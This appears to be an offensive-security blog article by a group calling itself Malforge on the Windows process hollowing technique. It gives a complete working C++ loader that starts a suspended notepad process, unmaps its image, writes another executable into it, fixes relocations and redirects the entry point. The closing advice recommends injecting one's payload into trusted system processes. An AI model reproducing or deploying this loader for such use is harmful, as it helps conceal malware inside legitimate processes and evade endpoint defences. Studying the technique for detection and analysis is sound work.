# Process Hollowing

## Introduction

Welcome to my new article! Today, I’ll be demonstrating the Process Hollowing technique — a popular sub-technique of process injection that has become one of the most widely used methods in recent years.

### What is?

Information by:

> Process Hollowing (Mitre:T1055.012) - Hacking Articles\
In July 2011, John Leitch of autosectools.com talked about a technique he called process
hollowing in his whitepaper, [hackingarticles.in](https://www.hackingarticles.in/process-hollowing-mitret1055-012/)

The core concept behind process hollowing is relatively simple. In this technique, an attacker starts by creating a new process in a suspended state. The legitimate process image is then unmapped—or 'hollowed out'—from memory. The attacker then writes malicious code into the emptied memory space and resumes the process, causing it to execute the injected payload instead of its original code.

### Injection Steps:

- Injecting the shellcode into target process
- Retrieve ImageBaseAddress of the executable image
- Read executable image of the remote process into a buffer
- Unmap executable image from the process
- Hook somewhere of the copied image so it will jump to shellcode
- Remap the section into the remote process using above techniques

![image](https://github.com/user-attachments/assets/5306c13d-38ab-4195-b055-d953b1b70268)

---

## Code

Code by:

> Process Hollowing and Portable Executable Relocations\
Code injection, [ired.team](https://www.ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations)

```c++
#include "pch.h"
#include <iostream>
#include <Windows.h>
#include <winternl.h>

using NtUnmapViewOfSection = NTSTATUS(WINAPI *)(HANDLE, PVOID);

typedef struct BASE_RELOCATION_BLOCK
{
    DWORD PageAddress;
    DWORD BlockSize;
} BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY
{
    USHORT Offset : 12;
    USHORT Type : 4;
} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;

int main()
{
    // create destination process - this is the process to be hollowed out
    LPSTARTUPINFOA si = new STARTUPINFOA();
    LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();
    PROCESS_BASIC_INFORMATION *pbi = new PROCESS_BASIC_INFORMATION();
    DWORD returnLenght = 0;
    CreateProcessA(NULL, (LPSTR) "c:\\windows\\syswow64\\notepad.exe", NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, si, pi);
    HANDLE destProcess = pi->hProcess;

    // get destination imageBase offset address from the PEB
    NtQueryInformationProcess(destProcess, ProcessBasicInformation, pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLenght);
    DWORD pebImageBaseOffset = (DWORD)pbi->PebBaseAddress + 8;

    // get destination imageBaseAddress
    LPVOID destImageBase = 0;
    SIZE_T bytesRead = NULL;
    ReadProcessMemory(destProcess, (LPCVOID)pebImageBaseOffset, &destImageBase, 4, &bytesRead);

    // read source file - this is the file that will be executed inside the hollowed process
    HANDLE sourceFile = CreateFileA("C:\\temp\\regshot.exe", GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL);
    DWORD sourceFileSize = GetFileSize(sourceFile, NULL);
    LPDWORD fileBytesRead = 0;
    LPVOID sourceFileBytesBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sourceFileSize);
    ReadFile(sourceFile, sourceFileBytesBuffer, sourceFileSize, NULL, NULL);

    // get source image size
    PIMAGE_DOS_HEADER sourceImageDosHeaders = (PIMAGE_DOS_HEADER)sourceFileBytesBuffer;
    PIMAGE_NT_HEADERS sourceImageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD)sourceFileBytesBuffer + sourceImageDosHeaders->e_lfanew);
    SIZE_T sourceImageSize = sourceImageNTHeaders->OptionalHeader.SizeOfImage;

    // carve out the destination image
    NtUnmapViewOfSection myNtUnmapViewOfSection = (NtUnmapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtUnmapViewOfSection"));
    myNtUnmapViewOfSection(destProcess, destImageBase);

    // allocate new memory in destination image for the source image
    LPVOID newDestImageBase = VirtualAllocEx(destProcess, destImageBase, sourceImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    destImageBase = newDestImageBase;

    // get delta between sourceImageBaseAddress and destinationImageBaseAddress
    DWORD deltaImageBase = (DWORD)destImageBase - sourceImageNTHeaders->OptionalHeader.ImageBase;

    // set sourceImageBase to destImageBase and copy the source Image headers to the destination image
    sourceImageNTHeaders->OptionalHeader.ImageBase = (DWORD)destImageBase;
    WriteProcessMemory(destProcess, newDestImageBase, sourceFileBytesBuffer, sourceImageNTHeaders->OptionalHeader.SizeOfHeaders, NULL);

    // get pointer to first source image section
    PIMAGE_SECTION_HEADER sourceImageSection = (PIMAGE_SECTION_HEADER)((DWORD)sourceFileBytesBuffer + sourceImageDosHeaders->e_lfanew + sizeof(IMAGE_NT_HEADERS32));
    PIMAGE_SECTION_HEADER sourceImageSectionOld = sourceImageSection;
    int err = GetLastError();

    // copy source image sections to destination
    for (int i = 0; i < sourceImageNTHeaders->FileHeader.NumberOfSections; i++)
    {
        PVOID destinationSectionLocation = (PVOID)((DWORD)destImageBase + sourceImageSection->VirtualAddress);
        PVOID sourceSectionLocation = (PVOID)((DWORD)sourceFileBytesBuffer + sourceImageSection->PointerToRawData);
        WriteProcessMemory(destProcess, destinationSectionLocation, sourceSectionLocation, sourceImageSection->SizeOfRawData, NULL);
        sourceImageSection++;
    }

    // get address of the relocation table
    IMAGE_DATA_DIRECTORY relocationTable = sourceImageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

    // patch the binary with relocations
    sourceImageSection = sourceImageSectionOld;
    for (int i = 0; i < sourceImageNTHeaders->FileHeader.NumberOfSections; i++)
    {
        BYTE *relocSectionName = (BYTE *)".reloc";
        if (memcmp(sourceImageSection->Name, relocSectionName, 5) != 0)
        {
            sourceImageSection++;
            continue;
        }

        DWORD sourceRelocationTableRaw = sourceImageSection->PointerToRawData;
        DWORD relocationOffset = 0;

        while (relocationOffset < relocationTable.Size)
        {
            PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)((DWORD)sourceFileBytesBuffer + sourceRelocationTableRaw + relocationOffset);
            relocationOffset += sizeof(BASE_RELOCATION_BLOCK);
            DWORD relocationEntryCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
            PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)((DWORD)sourceFileBytesBuffer + sourceRelocationTableRaw + relocationOffset);

            for (DWORD y = 0; y < relocationEntryCount; y++)
            {
                relocationOffset += sizeof(BASE_RELOCATION_ENTRY);

                if (relocationEntries[y].Type == 0)
                {
                    continue;
                }

                DWORD patchAddress = relocationBlock->PageAddress + relocationEntries[y].Offset;
                DWORD patchedBuffer = 0;
                ReadProcessMemory(destProcess, (LPCVOID)((DWORD)destImageBase + patchAddress), &patchedBuffer, sizeof(DWORD), &bytesRead);
                patchedBuffer += deltaImageBase;

                WriteProcessMemory(destProcess, (PVOID)((DWORD)destImageBase + patchAddress), &patchedBuffer, sizeof(DWORD), fileBytesRead);
                int a = GetLastError();
            }
        }
    }

    // get context of the dest process thread
    LPCONTEXT context = new CONTEXT();
    context->ContextFlags = CONTEXT_INTEGER;
    GetThreadContext(pi->hThread, context);

    // update dest image entry point to the new entry point of the source image and resume dest image thread
    DWORD patchedEntryPoint = (DWORD)destImageBase + sourceImageNTHeaders->OptionalHeader.AddressOfEntryPoint;
    context->Eax = patchedEntryPoint;
    SetThreadContext(pi->hThread, context);
    ResumeThread(pi->hThread);

    return 0;
}
```

Step 1: Creating a new process in a suspended state:
  - `CreateProcessA()` with `CREATE_SUSPENDED` flag set

Step 2: Swap out its memory contents (unmapping/hollowing):
  - `NtUnmapViewOfSection()`

Step 3: Input malicious payload in this unmapped region:
  - `VirtualAllocEx` : To allocate new memory
  - `WriteProcessMemory()` : To write each of malware sections to target the process space

Step 4: Setting EAX to the entrypoint:
  - `SetThreadContext()`

Step 5: Start the suspended thread:
  - `ResumeThread()`

---

## Conclusion

Below are all the steps and code needed to perform process hollowing. I suggest using this technique to inject your payload into either trusted system processes or custom processes you spawn yourself.

Thank You For Reading! :)

**- Malforge Group**

